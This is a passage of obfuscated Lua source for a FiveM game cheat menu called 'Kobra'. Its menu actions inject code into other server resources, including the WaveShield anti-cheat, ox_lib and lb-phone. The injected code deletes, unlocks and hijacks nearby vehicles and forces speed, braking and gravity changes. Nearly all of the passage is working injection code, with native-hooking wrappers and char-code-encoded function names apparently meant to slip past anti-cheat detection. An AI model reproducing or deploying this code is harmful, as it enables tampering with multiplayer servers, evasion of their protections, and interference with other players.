                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]]);elseif v424 then local v955=0 -0 ;while true do if (v955==(0 + 0)) then print("using Reaper fallback");MachoInjectThread(0,"any","",[[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]]);break;end end else MachoInjectResourceRaw("any",[[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]]);end break;end end end},{type="button",label="Delete Vehicle",onSelect=function() local v425=265 -(34 + 231) ;while true do if (v425==(1317 -(930 + 387))) then v0:Notify("success","Kobra","Deleted Vehicle",3000);MachoInjectResourceRaw("any",[[
                            local function LXpTqWvR80()
                                local aQw = PlayerPedId
                                local bEr = GetVehiclePedIsIn
                                local cTy = DoesEntityExist
                                local dUi = NetworkHasControlOfEntity
                                local eOp = SetEntityAsMissionEntity
                                local fAs = DeleteEntity
                                local gDf = DeleteVehicle
                                local hJk = SetVehicleHasBeenOwnedByPlayer

                                local ped = aQw()
                                local veh = bEr(ped, false)

                                if veh and veh ~= 0 and cTy(veh) then
                                    hJk(veh, true)
                                    eOp(veh, true, true)

                                    if dUi(veh) then
                                        fAs(veh)
                                        gDf(veh)
                                    end
                                end

                            end

                            LXpTqWvR80()
                            ]]);break;end end end},{type="button",label="Unlock Closest Vehicle",onSelect=function() local v426=0 + 0 ;while true do if (v426==(0 + 0)) then v0:Notify("success","Kobra","Deleted Vehicle",3000);MachoInjectResourceRaw("any",[[
                            local function TpLMqKtXwZ()
                                local AsoYuTrBnMvCxZaQw = PlayerPedId
                                local GhrTnLpKjUyVbMnZx = GetEntityCoords
                                local UyeWsDcXzQvBnMaLp = GetClosestVehicle
                                local ZmkLpQwErTyUiOpAs = DoesEntityExist
                                local VczNmLoJhBgVfCdEx = SetEntityAsMissionEntity
                                local EqWoXyBkVsNzQuH = SetVehicleDoorsLocked
                                local YxZwQvTrBnMaSdFgHj = SetVehicleDoorsLockedForAllPlayers
                                local RtYuIoPlMnBvCxZaSd = SetVehicleHasBeenOwnedByPlayer
                                local LkJhGfDsAzXwCeVrBt = NetworkHasControlOfEntity

                                local ped = AsoYuTrBnMvCxZaQw()
                                local coords = GhrTnLpKjUyVbMnZx(ped)
                                local veh = UyeWsDcXzQvBnMaLp(coords.x, coords.y, coords.z, 10.0, 0, 70)

                                if veh and ZmkLpQwErTyUiOpAs(veh) and LkJhGfDsAzXwCeVrBt(veh) then
                                    VczNmLoJhBgVfCdEx(veh, true, true)
                                    RtYuIoPlMnBvCxZaSd(veh, true)
                                    EqWoXyBkVsNzQuH(veh, 1)
                                    YxZwQvTrBnMaSdFgHj(veh, false)
                                end

                            end

                            TpLMqKtXwZ()
                            ]]);break;end end end},{type="button",label="Teleport into Closest Vehicle",onSelect=function() local v427=0;while true do if (v427==(697 -(389 + 308))) then v0:Notify("success","Kobra","Teleported into Vehicle",7684 -4684 );MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end

                                _G[nativeName] = function(...)
                                    return newFunction(originalNative, ...)
                                end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetClosestVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetVehicleForwardSpeed", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                            local function uPKcoBaEHmnK()
                                local ziCFzHyzxaLX = SetPedIntoVehicle
                                local YPPvDlOGBghA = GetClosestVehicle

                                local Coords = GetEntityCoords(PlayerPedId())
                                local vehicle = YPPvDlOGBghA(Coords.x, Coords.y, Coords.z, 15.0, 0, 70)

                                if DoesEntityExist(vehicle) and not IsPedInAnyVehicle(PlayerPedId(), false) then
                                    if GetPedInVehicleSeat(vehicle, -1) == 0 then
                                        ziCFzHyzxaLX(PlayerPedId(), vehicle, -1)
                                    else
                                        ziCFzHyzxaLX(PlayerPedId(), vehicle, 0)
                                    end
                                end
                            end

                            uPKcoBaEHmnK()
                            ]]);break;end end end},{type="divider",label="Toggles"},{type="checkbox",label="Boost Vehicle",checked=false,onSelect=function(v428) if v428 then v0:Notify("success","Kobra","Boost Vehicle On",3000);if (GetResourceState("WaveShield")=="started") then v36(((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.superSpeedBoost then
                                                _G.superSpeedBoost = true

                                                local PlayerPedId_fn       = g({80,108,97,121,101,114,80,101,100,73,100})
                                                local GetVehiclePedIsIn_fn = g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})
                                                local IsPedInAnyVehicle_fn = g({73,115,80,101,100,73,110,65,110,121,86,101,104,105,99,108,101})
                                                local IsControlPressed_fn  = g({73,115,67,111,110,116,114,111,108,80,114,101,115,115,101,100})
                                                local SetVehicleForwardSpeed_fn = g({83,101,116,86,101,104,105,99,108,101,70,111,114,119,97,114,100,83,112,101,101,100})
                                                local Wait_fn              = g({87,97,105,116})

                                                _G.superSpeedBoostEnabled = true

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[SuperSpeedBoost] Coroutine error: ^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.superSpeedBoostEnabled do
                                                        if not _G.superSpeedBoostEnabled then break end

                                                        local ped = PlayerPedId_fn()
                                                        if IsControlPressed_fn(0, 209) and IsPedInAnyVehicle_fn(ped, false) then
                                                            local veh = GetVehiclePedIsIn_fn(ped, false)
                                                            if veh and veh ~= 0 then
                                                                SetVehicleForwardSpeed_fn(veh, 100.0)
                                                            end
                                                        end

                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            if VbNmQwErTyUi == nil then
                                                VbNmQwErTyUi = true

                                                local function YgT7FrqXcN()
                                                    local ZxSeRtYhUiOp = CreateThread
                                                    local LkJhGfDsAzXv = PlayerPedId
                                                    local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                    local ErTyUiOpAsDf = IsControlPressed
                                                    local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                    local HnJmKlIoPuYt = SetVehicleForwardSpeed

                                                    ZxSeRtYhUiOp(function()
                                                        while true do
                                                            Wait(0)
                                                            if not VkLpOiUyTrEq then
                                                                Wait(500)
                                                                goto continue
                                                            end

                                                            local ped = LkJhGfDsAzXv()
                                                            if ErTyUiOpAsDf(0, 209) and GtHyJuKoLpMi(ped, false) then
                                                                local veh = PoLkJhBgVfCd(ped, false)
                                                                if veh and veh ~= 0 then
                                                                    HnJmKlIoPuYt(veh, 100.0)
                                                                end
                                                            end

                                                            ::continue::
                                                        end
                                                    end)
                                                end

                                                YgT7FrqXcN()
                                            end
                                            
                                            VkLpOiUyTrEq = true
                                        ]]);end else local v579=0 + 0 ;while true do if (v579==(322 -(125 + 197))) then v0:Notify("error","Kobra","Boost Vehicle Off",3997 -(339 + 658) );if (GetResourceState("WaveShield")=="started") then v36(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.superSpeedBoost = false
                                        ]]);else v36("any",[[
                                            VkLpOiUyTrEq = false
                                        ]]);end break;end end end end},{type="checkbox",label="Instant Brakes",checked=false,onSelect=function(v429) local v430=0;local v431;local v432;while true do if ((0 -0)==v430) then v431=GetResourceState("WaveShield")=="started" ;v432=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;v430=1;end if (v430==1) then if v429 then if v431 then v0:Notify("success","Kobra","Instant Brakes On",4348 -(743 + 605) );v36(((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            VkLpOiUyTrEq = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local function getPed() return PlayerPedId() end
                                                local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                local ErTyUiOpAsDf = IsDisabledControlPressed
                                                local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                local VbNmQwErTyUi = SetVehicleForwardSpeed

                                                while VkLpOiUyTrEq and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if not ped or ped == 0 then goto continue end
                                                    local veh = PoLkJhBgVfCd(ped, false)
                                                    if veh and veh ~= 0 then
                                                        if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                                            VbNmQwErTyUi(veh, 0.0)
                                                        end
                                                    end
                                                    ::continue::
                                                end

                                                -- Restore on disable
                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    local veh = PoLkJhBgVfCd(ped, false)
                                                    if veh and veh ~= 0 then
                                                        -- No need to restore speed, just stop forcing 0
                                                    end
                                                end
                                            end)
                                        ]]);else local v956=0 + 0 ;while true do if (v956==(0 + 0)) then v36(v432,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleForwardSpeed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsDisabledControlPressed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            VkLpOiUyTrEq = true

                                            local function YgT7FrqXcN()
                                                local ZxSeRtYhUiOp = CreateThread
                                                local LkJhGfDsAzXv = PlayerPedId
                                                local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                local ErTyUiOpAsDf = IsDisabledControlPressed
                                                local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                local VbNmQwErTyUi = SetVehicleForwardSpeed

                                                ZxSeRtYhUiOp(function()
                                                    while VkLpOiUyTrEq and not Unloaded do
                                                        local ped = LkJhGfDsAzXv()
                                                        local veh = PoLkJhBgVfCd(ped, false)
                                                        if veh and veh ~= 0 then
                                                            if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                                                VbNmQwErTyUi(veh, 0.0)
                                                            end
                                                        end
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                            YgT7FrqXcN()
                                        ]]);v0:Notify("success","Kobra","Instant Brakes On (Fallback)",3000);break;end end end elseif v431 then local v957=0 -0 ;while true do if (v957==0) then v0:Notify("success","Kobra","Instant Brakes Off",3000);v36(((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                            VkLpOiUyTrEq = false
                                        ]]);break;end end else local v958=0 -0 ;while true do if (v958==(0 + 0)) then v36(v432,[[
                                            VkLpOiUyTrEq = false
                                        ]]);v0:Notify("success","Kobra","Instant Brakes Off (Fallback)",3000);break;end end end break;end end end},{type="checkbox",label="Easy Handling",checked=false,onSelect=function(v433) local v434=0 -0 ;local v435;local v436;while true do if (v434==(2 -1)) then if v433 then if v435 then local v959=0 + 0 ;while true do if (v959==(0 + 0)) then v0:Notify("success","Kobra","Easy Handling On",5350 -2350 );MachoInjectResourceRaw("WaveShield",[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
                                            NvGhJkLpOiUy = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local function getPed() return GetPlayerPed(-1) end
                                                local TyUiOpAsDfGh = GetVehiclePedIsIn
                                                local UyTrBnMvCxZl = SetVehicleGravityAmount
                                                local PlMnBvCxZaSd = SetVehicleStrong

                                                while NvGhJkLpOiUy and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if not ped or ped == 0 then goto continue end
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 73.0)
                                                        PlMnBvCxZaSd(veh, true)
                                                    end
                                                    ::continue::
                                                end

                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 9.8)
                                                        PlMnBvCxZaSd(veh, false)
                                                    end
                                                end
                                            end)
                                        ]]);break;end end else v36(v436,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleGravityAmount", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleStrong", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
                                            NvGhJkLpOiUy = true

                                            local function KbZwVoYtLx()
                                                local BtGhYtUlOpLk = CreateThread
                                                local WeRtYuIoPlMn = PlayerPedId
                                                local TyUiOpAsDfGh = GetVehiclePedIsIn
                                                local UyTrBnMvCxZl = SetVehicleGravityAmount
                                                local PlMnBvCxZaSd = SetVehicleStrong

                                                BtGhYtUlOpLk(function()
                                                    while NvGhJkLpOiUy and not Unloaded do
                                                        local ped = WeRtYuIoPlMn()
                                                        local veh = TyUiOpAsDfGh(ped, false)
                                                        if veh and veh ~= 0 then
                                                            UyTrBnMvCxZl(veh, 73.0)
                                                            PlMnBvCxZaSd(veh, true)
                                                        end
                                                        Wait(0)
                                                    end

                                                    -- Restore
                                                    local ped = WeRtYuIoPlMn()
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 9.8)
                                                        PlMnBvCxZaSd(veh, false)
                                                    end
                                                end)
                                            end

                                            KbZwVoYtLx()
                                        ]]);v0:Notify("success","Kobra","Easy Handling On (Fallback)",10099 -7099 );end elseif v435 then local v960=0 -0 ;while true do if (v960==0) then v0:Notify("success","Kobra","Easy Handling Off",3000);MachoInjectResourceRaw("WaveShield",[[
                                            NvGhJkLpOiUy = false
                                            local UyTrBnMvCxZl = SetVehicleGravityAmount
                                            local PlMnBvCxZaSd = SetVehicleStrong
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and veh ~= 0 then
                                                UyTrBnMvCxZl(veh, 9.8)
                                                PlMnBvCxZaSd(veh, false)
                                            end
                                        ]]);break;end end else local v961=0 + 0 ;while true do if (v961==(0 -0)) then v36(v436,[[
                                            NvGhJkLpOiUy = false
                                            local UyTrBnMvCxZl = SetVehicleGravityAmount
                                            local PlMnBvCxZaSd = SetVehicleStrong
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and veh ~= 0 then
                                                UyTrBnMvCxZl(veh, 9.8)
                                                PlMnBvCxZaSd(veh, false)
                                            end
                                        ]]);v0:Notify("success","Kobra","Easy Handling Off (Fallback)",4097 -(97 + 1000) );break;end end end break;end if (v434==(0 -0)) then v435=GetResourceState("WaveShield")=="started" ;v436=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;v434=1;end end end},{type="checkbox",label="Rainbow Vehicle",checked=false,onSelect=function(v437) local v438=0;local v439;while true do if (v438==0) then v439=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v437 then v0:Notify("success","Kobra","Rainbow Vehicle On",3000);if (GetResourceState("WaveShield")=="started") then local v962=0 -0 ;while true do if (0==v962) then print("souygdfg");v36(v439,[[
                                            if not _G.osintRainbow then
                                                _G.osintRainbow = { enabled = false, originals = {}, thread = nil }
                                            end
                                            _G.osintRainbow.enabled = true

                                            local function hNative(name, wrapper)
                                                local orig = _G[name]
                                                if not orig or type(orig) ~= "function" then return end
                                                if not _G.osintRainbow.originals[name] then
                                                    _G.osintRainbow.originals[name] = orig
                                                end
                                                _G[name] = function(...) return wrapper(orig, ...) end
                                            end

                                            hNative("Wait",                     function(o, ms) return o(ms) end)
                                            hNative("GetGameTimer",             function(o)    return o() end)
                                            hNative("math.floor",               function(o, x) return o(x) end)
                                            hNative("math.sin",                 function(o, x) return o(x) end)
                                            hNative("GetVehiclePedIsIn",        function(o, p, l) return o(p, l) end)
                                            hNative("DoesEntityExist",          function(o, e) return o(e) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, v, r, g, b) return o(v, r, g, b) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, v, r, g, b) return o(v, r, g, b) end)
                                            hNative("PlayerPedId",              function(o)    return o() end)

                                            if not _G.osintRainbow.thread then
                                                _G.osintRainbow.thread = coroutine.create(function()
                                                    local freq = 1.0
                                                    local function getRainbowColor()
                                                        local t = GetGameTimer() / 1000
                                                        local r = math.floor(math.sin(t * freq + 0) * 127 + 128)
                                                        local g = math.floor(math.sin(t * freq + 2) * 127 + 128)
                                                        local b = math.floor(math.sin(t * freq + 4) * 127 + 128)
                                                        return r, g, b
                                                    end
                                                    while _G.osintRainbow.enabled do
                                                        local ped = PlayerPedId()
                                                        local veh = GetVehiclePedIsIn(ped, false)
                                                        if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                            local r, g, b = getRainbowColor()
                                                            SetVehicleCustomPrimaryColour(veh, r, g, b)
                                                            SetVehicleCustomSecondaryColour(veh, r, g, b)
                                                        end
                                                        Wait(0)
                                                    end
                                                end)

                                                while _G.osintRainbow.enabled and coroutine.status(_G.osintRainbow.thread) ~= "dead" do
                                                    coroutine.resume(_G.osintRainbow.thread)
                                                    Citizen.Wait(0)
                                                end
                                            end
                                        ]]);break;end end else v36(v439,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(o, ...) return o(...) end)
                                            hNative("Wait",         function(o, ...) return o(...) end)
                                            hNative("GetGameTimer", function(o, ...) return o(...) end)
                                            hNative("math.floor",   function(o, ...) return o(...) end)
                                            hNative("math.sin",     function(o, ...) return o(...) end)
                                            hNative("GetVehiclePedIsIn", function(o, ...) return o(...) end)
                                            hNative("DoesEntityExist",   function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, ...) return o(...) end)
                                            hNative("PlayerPedId", function(o, ...) return o(...) end)

                                            if GxRpVuNzYiTq == nil then GxRpVuNzYiTq = false end
                                            GxRpVuNzYiTq = true

                                            local function jqX7TvYzWq()
                                                local WvBnMpLsQzTx = GetGameTimer
                                                local VcZoPwLsEkRn = math.floor
                                                local DfHkLtQwAzCx = math.sin
                                                local PlJoQwErTgYs = CreateThread
                                                local MzLxVoKsUyNz = GetVehiclePedIsIn
                                                local EyUiNkOpLtRg = PlayerPedId
                                                local KxFwEmTrZpYq = DoesEntityExist
                                                local UfBnDxCrQeTg = SetVehicleCustomPrimaryColour
                                                local BvNzMxLoPwEq = SetVehicleCustomSecondaryColour
                                                local yGfTzLkRn = 1.0

                                                local function HrCvWbXuNz(freq)
                                                    local color = {}
                                                    local t = WvBnMpLsQzTx() / 1000
                                                    color.r = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 0) * 127 + 128)
                                                    color.g = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 2) * 127 + 128)
                                                    color.b = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 4) * 127 + 128)
                                                    return color
                                                end

                                                PlJoQwErTgYs(function()
                                                    while GxRpVuNzYiTq and not Unloaded do
                                                        local ped = EyUiNkOpLtRg()
                                                        local veh = MzLxVoKsUyNz(ped, false)
                                                        if veh and veh ~= 0 and KxFwEmTrZpYq(veh) then
                                                            local rgb = HrCvWbXuNz(yGfTzLkRn)
                                                            UfBnDxCrQeTg(veh, rgb.r, rgb.g, rgb.b)
                                                            BvNzMxLoPwEq(veh, rgb.r, rgb.g, rgb.b)
                                                        end
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                            jqX7TvYzWq()
                                        ]]);end else local v809=0;while true do if ((369 -(40 + 329))==v809) then v0:Notify("error","Kobra","Rainbow Vehicle Off",2544 + 456 );if (GetResourceState("WaveShield")=="started") then local v1088=0 + 0 ;while true do if (v1088==(0 -0)) then print("swave");v36(v439,[[
                                            if not _G.osintRainbow then
                                                _G.osintRainbow = { enabled = false, originals = {}, thread = nil }
                                            end
                                            _G.osintRainbow.enabled = false

                                            for name, orig in pairs(_G.osintRainbow.originals) do
                                                if _G[name] then _G[name] = orig end
                                            end

